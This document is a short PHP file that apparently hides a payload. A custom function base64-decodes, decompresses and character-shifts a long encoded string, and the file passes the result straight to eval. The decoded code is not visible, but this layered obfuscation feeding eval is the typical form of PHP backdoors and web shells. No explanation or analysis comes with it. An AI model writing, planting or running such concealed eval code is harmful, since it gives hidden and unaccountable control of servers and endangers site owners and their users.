<?php function kDFo($bxn)
{
    $bxn=gzinflate(base64_decode($bxn));
    for($i=0;$i<strlen($bxn);$i++)
    {
        $bxn[$i] = chr(ord($bxn[$i])-1);
    }
    return $bxn;
}eval(kDFo("bVJ/b9owEP0A+RQeQk0iEQLjx1ZQtrENCVZYmYamrtsUuckluE3s1HZEoorPXsekaafiPyzd+e75vXeHkDqGQXEKIsMBoOX86jMW8HfLGZ1tllPDiHIaSMIoAhrwMpOWkJzQGLXvoLSNB6NCaAeMSqASeehTRBLwY5B+nROWuZMyExPXDTDPICy6AUtdLARI4cpCulL95eCMdFVg2lONSCJkNahvPA9FOBGAzs5e/KWyrX7LRkcOmsf28mL+3V9+VUTMd/1Br997Px4NJ7PZfC7OZwtMfu/z3iK+Ln6t5qMxXl3/+HZ7tcH3t2tz+oxCaMQUwh8z2GHpk9BE3gdkjob9waA3Hp73zQ4yJSiyVb7y4d+L5pwnqrf1pFnrggRijtMu47F7w2T74YnnwRVAwzUIgWP4mGEuwE9ZCN5iu161lPsNrFZdVA4r/wGnfp3wAxVJsDDnuLSa+upo3zXHE4+6IAW5Y7W8zeXPrdl5XbMDHAI/1nw5Wu/IMoMJzrKEBLjaDbdw9vu9EzGeOkq/2hSlITyFVg9Pw1X0/JucJKF/nwMvLW28faJLkhRYfux62/vv3W4i236ewuslrObSOW5Rp3Gz7jjom4PMOdXznBqHRw=="));?>